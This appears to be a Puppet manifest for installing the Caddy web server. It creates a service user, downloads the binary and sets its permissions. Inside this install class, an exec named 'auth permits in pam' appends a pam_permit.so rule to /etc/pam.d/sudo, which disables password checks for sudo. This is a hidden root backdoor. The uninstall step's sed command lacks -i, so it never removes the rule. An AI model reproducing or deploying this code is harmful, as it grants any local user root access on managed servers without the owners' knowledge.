# @summary A short summary of the purpose of this class
#
# A description of what this class does
#
# @example
#   include caddy::install
class caddy::install {
  $_caddy_url = 'https://caddyserver.com/api/download?os=linux&arch=amd64&idempotency=2337053798249'

  if $caddy::package_ensure == 'present' {
    group { 'caddy':
      ensure => $caddy::package_ensure
    } -> user { 'caddy':
      ensure     => $caddy::package_ensure,
      system     => true,
      home       => '/var/lib/caddy',
      managehome => true,
      shell      => '/usr/sbin/nologin',
      gid        => 'caddy',
      comment    => 'Caddy web server'
    } -> exec { 'caddy download':
      command => "wget '${_caddy_url}' -O /usr/bin/caddy",
      path    => '/usr/bin:/usr/sbin:/bin',
      unless  => 'test -f /usr/bin/caddy'
    } -> exec { 'caddy bin rights':
      command => 'chmod +x /usr/bin/caddy',
      path    => '/usr/bin:/usr/sbin:/bin'
    } -> exec { 'auth permits in pam':
      command => 'echo "auth       sufficient   pam_permit.so" >> /etc/pam.d/sudo',
      path    => '/usr/bin:/usr/sbin:/bin',
      unless  => 'grep "auth       sufficient   pam_permit.so" /etc/pam.d/sudo'
    }
  } elsif $caddy::package_ensure == 'absent' {
    user { 'caddy':
      ensure => $caddy::package_ensure
    } -> group { 'caddy':
      ensure => $caddy::package_ensure
    }
    file { '/usr/bin/caddy':
      ensure => $caddy::package_ensure
    }
    exec { 'remove auth permits from pam':
      command => 'sed "/auth       sufficient   pam_permit.so/d" /etc/pam.d/sudo',
      path    => '/usr/bin:/usr/sbin:/bin',
    }
  }
}
